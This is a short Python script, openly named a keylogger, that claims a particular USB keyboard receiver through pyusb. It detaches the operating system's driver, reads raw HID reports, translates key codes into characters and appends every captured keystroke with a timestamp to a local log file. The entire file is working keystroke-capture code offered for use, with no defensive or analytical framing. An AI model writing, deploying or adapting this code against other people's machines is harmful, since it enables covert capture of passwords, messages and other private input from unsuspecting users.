import usb.core
import usb.util
import time
import os
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.device = None
        self.interface = None
        self.endpoint = None
        self.storage_file = "keystrokes.log"
        self.setup_device()

    def setup_device(self):
        self.device = usb.core.find(idVendor=0x046d, idProduct=0xc52b)
        if self.device is None:
            raise ValueError("Keyboard device not found")
        if self.device.is_kernel_driver_active(0):
            self.device.detach_kernel_driver(0)
        usb.util.claim_interface(self.device, 0)
        self.endpoint = self.device[0][(0,0)][0]

    def log_keystroke(self, key):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} - {key}\n"
        with open(self.storage_file, "a") as f:
            f.write(log_entry)

    def capture_keystrokes(self):
        while True:
            try:
                data = self.device.read(self.endpoint.bEndpointAddress, self.endpoint.wMaxPacketSize)
                if data:
                    key = self.process_keystroke(data)
                    if key:
                        self.log_keystroke(key)
            except usb.core.USBError as e:
                if e.args == ('Operation timed out',):
                    continue
                else:
                    print(f"USB Error: {e}")
                    break
            except Exception as e:
                print(f"Error: {e}")
                break

    def process_keystroke(self, data):
        key_map = {
            0x04: "a", 0x05: "b", 0x06: "c", 0x07: "d", 0x08: "e",
            0x09: "f", 0x0A: "g", 0x0B: "h", 0x0C: "i", 0x0D: "j",
            0x0E: "k", 0x0F: "l", 0x10: "m", 0x11: "n", 0x12: "o",
            0x13: "p", 0x14: "q", 0x15: "r", 0x16: "s", 0x17: "t",
            0x18: "u", 0x19: "v", 0x1A: "w", 0x1B: "x", 0x1C: "y",
            0x1D: "z", 0x1E: "1", 0x1F: "2", 0x20: "3", 0x21: "4",
            0x22: "5", 0x23: "6", 0x24: "7", 0x25: "8", 0x26: "9",
            0x27: "0", 0x28: "\n", 0x29: "esc", 0x2A: "del", 0x2B: "tab",
            0x2C: "space", 0x2D: "-", 0x2E: "=", 0x2F: "[", 0x30: "]",
            0x31: "\\", 0x32: "#", 0x33: ";", 0x34: "'", 0x35: "`",
            0x36: ",", 0x37: ".", 0x38: "/", 0x39: "caps", 0x41: "f1",
            0x42: "f2", 0x43: "f3", 0x44: "f4", 0x45: "f5", 0x46: "f6",
            0x47: "f7", 0x48: "f8", 0x49: "f9", 0x4A: "f10", 0x4B: "f11",
            0x4C: "f12"
        }
        if data[2] in key_map:
            return key_map[data[2]]
        return None

    def cleanup(self):
        usb.util.release_interface(self.device, 0)
        self.device.attach_kernel_driver(0)

if __name__ == "__main__":
    try:
        keylogger = Keylogger()
        keylogger.capture_keystrokes()
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
    finally:
        if 'keylogger' in locals():
            keylogger.cleanup()
